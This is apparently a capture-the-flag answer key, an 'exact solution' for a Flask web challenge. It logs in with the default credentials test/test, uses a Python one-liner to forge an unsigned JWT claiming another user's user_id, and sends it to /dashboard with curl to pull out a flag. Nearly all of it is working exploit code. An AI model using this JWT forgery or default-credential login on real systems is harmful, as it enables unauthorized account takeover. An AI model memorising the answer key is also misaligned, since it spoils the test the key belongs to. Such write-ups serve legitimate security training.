# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Broken auth via an unverified JWT (IDOR) + default creds. The
`/dashboard` page trusts the `user_id` claim in the `auth_token` JWT without
verifying its signature. Forge a token for the `flag` account (user_id 10019).
A valid Flask `session` cookie from a normal login is also needed.

1. **Log in** with default creds `test` / `test` to get a valid session cookie:

   ```
   curl -s -c cookies.txt -X POST "http://<target>/password/test" -d "password=test" -i
   ```

2. **Forge a JWT** claiming `user_id: 10019` (signature is irrelevant — never
   verified):

   ```
   FORGED=$(python3 -c "
   import base64, json
   b=lambda d: base64.urlsafe_b64encode(d).rstrip(b'=')
   h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
   p=b(json.dumps({'username':'flag','user_id':10019,'user_type':'customer'}).encode())
   print((h+b'.'+p+b'.'+b(b'invalidsignature')).decode())
   ")
   ```

3. **Request `/dashboard`** with the valid session cookie plus the forged
   `auth_token` (pull the session value from the cookie jar):

   ```
   SESSION=$(grep -o 'session[[:space:]].*' cookies.txt | tail -1 | awk '{print $NF}')
   curl -s "http://<target>/dashboard" -H "Cookie: session=${SESSION}; auth_token=${FORGED}"
   ```

4. **Extract the flag** (`FLAG{...}`) from the "Welcome, Flag ..." response and
   report it verbatim.
